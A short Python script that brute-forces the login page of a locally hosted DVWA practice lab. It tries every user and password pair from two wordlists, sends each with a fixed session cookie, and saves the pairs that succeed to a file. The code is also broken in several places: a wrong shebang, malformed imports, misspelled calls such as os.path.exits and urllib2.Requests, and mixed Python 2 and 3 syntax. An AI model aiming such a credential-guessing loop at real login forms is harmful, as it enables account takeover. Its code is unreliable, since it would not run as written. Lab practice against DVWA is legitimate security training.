#!/bin/bash env python3
import os;sys;urllib2
#Check Parameters
if len(sys.argv)!=3:
        sys.stderr.write('Usage: '+sys.argv[0]+'userlist passwordlist\n')
        sys.exit(1)
if not os.path.exits(sys.argv[1]):
        sys.stderr.write('userlist was not found\n')
        sys.exit(1)
if not os.path.exits(sys.argv[2]):
        sys.stderr.write('passwordlist was not found\n')
        sys.exit(1)
else:
        print("Loading Your List....")
        #Read and split userfile
        userfile=open(sys.argv[1],"r")
        users=userfile.read().split("\n")
        userfile.close()

        #Read and split passwordfile
        passfile=open(sys.argv[2],"r")
        passwords=passfile.read().split("\n")
        passfile.close()

        #Take the Parameters and make requests
        for user in users:
                for password in passwords:
                        print("Trying %s:%s")%(user,password)
                        url="http://127.0.0.1/DVWA-master/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login"%(user,password)
                        req=urllib2.Requests(url)
                        req.add_header("Cookie","security=low;PHPSESSID=66lg384dqef9tpo69pa8b3g32r")
                        response = urllib2.urlopen(req)
                        html=response.read()

                        #Print and Write into a file sucessful attempts
                        if "Username and/or Password incorrect" not in html:
                                print("Login:Password are %s:%s")%(user,password)
                                pas = open('done.txt','a')
                                pas.write('%s:%s\n'%(user,password))
                                pas.close()
